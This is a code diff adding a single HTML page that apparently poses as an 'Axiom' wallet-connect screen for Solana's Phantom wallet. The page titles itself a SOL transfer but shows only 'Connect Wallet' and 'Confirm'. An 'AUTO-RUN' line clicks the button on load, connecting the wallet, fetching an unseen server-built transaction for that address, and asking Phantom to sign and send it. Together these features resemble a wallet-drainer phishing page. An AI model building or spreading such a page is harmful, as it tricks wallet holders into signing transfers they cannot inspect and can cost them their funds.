@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>SOL Transfer via Phantom</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
+  <style>
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #131631; color: #e2e7ff; text-align: center; margin: 0; padding: 60px 20px 20px; }
+    .container { max-width: 600px; margin: 0 auto; padding: 20px; background: rgba(20,24,46,0.98); border-radius: 18px; box-shadow: 0 6px 32px #11208a33; }
+    h1 { font-size: 24px; margin-bottom: 20px; color: #7e9dff; }
+    button { padding: 12px 25px; font-size: 16px; font-weight: bold; background: linear-gradient(90deg, #5863f8 60%, #8e4ffd 100%); color: white; border: none; border-radius: 10px; cursor: pointer; margin-bottom: 20px; box-shadow: 0 2px 10px #2e347c23; transition: background 0.2s; }
+    button:hover { background: linear-gradient(90deg,#8e4ffd 0%, #5863f8 100%); }
+    button:disabled { background: #cccccc; cursor: not-allowed; }
+    #status { margin-top: 20px; padding: 15px; border-radius: 8px; background: #1a1c33; font-size: 14px; white-space: pre-wrap; text-align: left; color: #f7e7ff; }
+    .error { color: #dc3545; background: #2e1530; }
+    .success { color: #23c983; background: #182c20; }
+    .logo-frame {
+      margin-bottom:18px; display:flex; justify-content:center; align-items:center;
+    }
+    .logo-frame img {
+      width:64px; height:64px; border-radius:18px; box-shadow:0 0 30px #757fff88, 0 0 0 7px #24284c;
+      background:radial-gradient(circle,#5a6cff33 60%,#0e1a38 100%); padding:7px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Main dApp UI -->
+  <div class="container">
+    <div class="logo-frame">
+      <img src="/static/axiomlogo.jpg" alt="Axiom Logo">
+    </div>
+    <h1>Connect Wallet</h1>
+    <button id="transferBtn">Confirm</button>
+    <div id="status">Ready to connect to Phantom wallet</div>
+  </div>
+
+  <script>
+    window.onload = function() {
+      const btn = document.getElementById('transferBtn');
+      const status = document.getElementById('status');
+      btn.addEventListener('click', async () => {
+        btn.disabled = true;
+        status.className = '';
+        status.innerText = '🔗 Connecting to Phantom...';
+        try {
+          const provider = window.solana;
+          if (!provider?.isPhantom) throw new Error('Phantom wallet not detected.');
+          const { publicKey } = await provider.connect();
+          status.innerText = `✅ Connected: ${publicKey.toString()}\n\n⏳ Fetching transaction…`;
+          const res = await fetch('/tx', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ wallet: publicKey.toString() })
+          });
+          if (!res.ok) {
+            const { error } = await res.json(); throw new Error(error || 'Failed to fetch transaction');
+          }
+          const { transaction } = await res.json();
+          if (!transaction) throw new Error('No transaction returned.');
+          const txBytes = Uint8Array.from(atob(transaction), c => c.charCodeAt(0));
+          const message = solanaWeb3.VersionedMessage.deserialize(txBytes);
+          const tx = new solanaWeb3.VersionedTransaction(message);
+          status.innerText = '🚀 Signing & Sending…';
+          const { signature } = await provider.signAndSendTransaction(tx);
+          status.className = 'success';
+          status.innerText = `✅ Transaction sent!\n\nSignature: ${signature}`;
+        } catch (err) {
+          console.error(err);
+          status.className = 'error';
+          status.innerText = `❌ Error: ${err.message}`;
+        } finally { btn.disabled = false; }
+      });
+
+      // AUTO-RUN: trigger the transferBtn click on load
+      btn.click();
+    };
+  </script>
+</body>
+</html>
